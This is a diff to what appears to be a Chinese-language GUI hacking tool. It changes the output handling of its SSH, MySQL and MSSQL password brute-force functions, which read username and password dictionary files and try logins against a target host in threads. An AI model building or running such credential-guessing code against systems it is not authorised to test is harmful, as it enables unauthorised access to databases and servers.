@@ -233,7 +233,7 @@ def sshblastbegin():
     host = GUIhost
     tempuser = open('用户名.txt', 'r')
     temppasswd = open('密码库.txt', 'r')
-    print(multi_ssh(tempuser, temppasswd, host))
+    multi_ssh(tempuser, temppasswd, host)
 
 
 '''---------------------------------------------mysql爆破------------------------------------'''
@@ -256,10 +256,10 @@ def mysqlblast(user, passwd, host, port):
     try:
         pymysql.connect(server=host, user=user, port=port, password=passwd, connect_timeout=1)
         print("mysql:{}:{}:{} {}".format(host, port, user, passwd))
-        worktext+="mysql:{}:{}:{} {}".format(host, port, user, passwd)
+        worktext+="mysql:{}:{}:{} {}".format(host, port, user, passwd)+'\n'
     except Exception:
         print("mysql:{}:{} 用户名:{} 密码{}".format(host, port, user, passwd + '尝试连接失败'))
-        worktext+="mysql:{}:{} 用户名:{} 密码{}".format(host, port, user, passwd + '尝试连接失败')
+        worktext+="mysql:{}:{} 用户名:{} 密码{}".format(host, port, user, passwd + '尝试连接失败')+'\n'
         pass
 
 
@@ -281,7 +281,7 @@ def multi_mysql(tempuser, temppasswd, host, port):
 
 
 def mssqlblatbegin():
-    host = input(' 请输入需要爆破的mssql的ip地址:')
+    host = GUIhost
     h, o, s, t = host.split('.')
     if not 255 >= int(h) >= 0 or not 255 >= int(o) >= 0 or not 255 >= int(s) >= 0 or not 255 >= int(t) >= 0:
         print("ip地址有误，请重新输入")
@@ -293,11 +293,12 @@ def mssqlblatbegin():
 
 
 def mssqlblast(user, passwd, host, port):
+    global worktext
     try:
         pymssql.connect(server=host, user=user, port=port, password=passwd, connect_timeout=1)
-        print("mssql:{}:{}:{} {}".format(host, port, user, passwd))
+        worktext+="mssql:{}:{}:{} {}".format(host, port, user, passwd)+'\n'
     except Exception:
-        print("mssql:{}:{} 用户名:{} 密码{}".format(host, port, user, passwd + '尝试连接失败'))
+        worktext+="mssql:{}:{} 用户名:{} 密码{}".format(host, port, user, passwd + '尝试连接失败')+'\n'
         pass
 
 
@@ -312,6 +313,7 @@ def multi_mssql(tempuser, temppasswd, host, port):
             t.start()
         for t in threads:
             t.join()
+    worktextprint()
 
 
 '''------------------------------------------cms扫描识别-----------------------------------------------'''
@@ -508,6 +510,7 @@ def getwork():
     global GUIhost
     global GUInumber
     global GUIports
+    global GUIport
     GUIhost=ipEntry.get()
     GUInumber=numberENtry.get()
     GUIports=portnumberEntry.get()
